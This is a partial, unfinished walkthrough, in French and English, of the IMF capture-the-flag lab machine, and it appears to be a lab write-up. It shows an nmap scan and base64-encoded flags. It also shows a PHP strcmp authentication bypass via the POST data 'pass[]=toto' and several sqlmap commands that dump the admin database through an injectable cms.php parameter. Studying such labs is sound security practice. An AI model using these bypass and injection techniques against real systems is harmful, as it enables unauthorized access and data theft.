@@ -1,0 +1,166 @@
+to be continued
+IMF :
+IP : 10.0.1.102
+
+http://10.0.1.102
+
+===================
+Première phase:
+scan via nmap :
+root@DebSec:~# nmap -sV 10.0.1.102
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-04 18:06 CET
+Nmap scan report for imf (10.0.1.102)
+Host is up (0.0014s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE    VERSION
+80/tcp open  tcpwrapped
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.50 seconds
+
+==================
+On the code source on the home page :
+        <!-- Js -->
+        <script src="js/vendor/modernizr-2.6.2.min.js"></script>
+        <script src="js/vendor/jquery-1.10.2.min.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
+        <script src="js/XUnRhVzVwYzNS.js"></script>
+        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
+        <script>
+         new WOW(
+            ).init();
+        </script>
+
+I call one by one the page in js :
+rabbit hole. Nothing.
+
+Well if I take the script title and paste it :
+ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
+
+root@DebSec:~# echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d
+flag2{aW1mYWRtaW5pc3RyYXRvcg==}root@DebSec:~# 
+
+root@DebSec:~# echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d
+imfadministrator 
+
+But where is the flag 1 ?
+Oh in source code of contact.php :
+<section id="service">
+        <div class="container">
+            <!-- flag1{YWxsdGhlZmlsZXM=} -->
+            <div class="service-wrapper">
+
+echo "YWxsdGhlZmlsZXM=" |base64 -d
+
+root@DebSec:~# echo "YWxsdGhlZmlsZXM=" |base64 -d
+allthefiles
+
+Well going into the page imfadministrator :
+login/password Sqli ?
+in source code :
+    <form method="POST" action="">
+    <label>Username:</label><input type="text" name="user" value=""><br />
+    <label>Password:</label><input type="password" name="pass" value=""><br />
+    <input type="submit" value="Login">
+    <!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
+    </form>
+
+So no sqli, hard coded !!
+Search for a potential login/password :
+in page contact we have three contact :
+Roger S. Michaels
+rmichaels@imf.local
+Director
+
+Alexander B. Keith
+akeith@imf.local
+Deputy Director
+
+Elizabeth R. Stone
+estone@imf.local
+Chief of Staff
+
+Lookat this :
+http://danuxx.blogspot.fr/2013/03/unauthorized-access-bypassing-php-strcmp.html
+https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet
+
+Pour cela on utilise l'extension de FFox : hackbar.
+Dans le champs LoadURL on place : http://10.0.1.102/imfadministrator/
+On coche la case : Enable POST data
+Dans le champs Post data on indique : user=rmichaels&pass[]=toto
+Dans la page on obtient :
+flag3{Y29udGludWVUT2Ntcw==}
+Welcome, rmichaels
+IMF CMS
+
+La dernière ligne est un lien : IMF CMS, allons-y !!
+En attendant decodons le : Y29udGludWVUT2Ntcw==
+echo "Y29udGludWVUT2Ntcw==" | base64 -d 
+continueTOcms
+
+Donc on continue en cliquant sur le lien et on tombe sur cette page :
+http://10.0.1.102/imfadministrator/cms.php?pagename=home
+
+en naviguant dans le site on vois qu'il y a des liens :
+Menu: Home | Upload Report | Disavowed list | Logout 
+Chaque lien nous donne une page : on tente le coup SQLI.
+
+test :
+http://10.0.1.102/imfadministrator/cms.php?pagename='
+et ça donne :
+ Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29
+
+Bingo sqli...
+on lance un petit sqlmap (en ayant pris soin de copier/coller le cookie) :
+sqlmap --threads 10 --url http://10.0.1.102/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vpfa4iqtf10ib123gmhpl6fiv7"
+
+Après plusieurs tentatives :
+root@DebSec:~# sqlmap --threads 10 --url http://10.0.1.102/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vpfa4iqtf10ib123gmhpl6fiv7" --dbms=mysql --dbs
+
+root@DebSec:~# sqlmap --threads 10 --url http://10.0.1.102/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vpfa4iqtf10ib123gmhpl6fiv7" --dbms=mysql -D admin --tables
+
+root@DebSec:~# sqlmap --threads 10 --url http://10.0.1.102/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vpfa4iqtf10ib123gmhpl6fiv7" --dbms=mysql -D admin -T pages --columns
+
+root@DebSec:~# sqlmap --threads 10 --url http://10.0.1.102/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vpfa4iqtf10ib123gmhpl6fiv7" --dbms=mysql -D admin -T pages -C pagedata --data
+
+root@DebSec:~# sqlmap --threads 10 --url http://10.0.1.102/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vpfa4iqtf10ib123gmhpl6fiv7" --dbms=mysql -D admin -T pages -C pagename --dump
+
+Database: admin
+Table: pages
+[4 entries]
++----------------------+
+| pagename             |
++----------------------+
+| disavowlist          |
+| home                 |
+| tutorials-incomplete |
+| upload               |
++----------------------+
+
+Avec ceci on vient d'énumerer les pages existantes du site mais il y en a une de plus :
+tutorials-incomplete.
+
+Allez go via un navigateur :
+on telecharge l'image, elle contient unn QRcode et on la passe dans ce site : https://zxing.org/w/decode
+
+On obtient :
+flag4{dXBsb2Fkcjk0Mi5waHA=}
+
+Toujours pareil on decode :
+echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d
+uploadr942.php
+
+On appelle cette page :
+http://10.0.1.102/imfadministrator/uploadr942.php
+
+
+
+
+
+
+====================
+
+
+
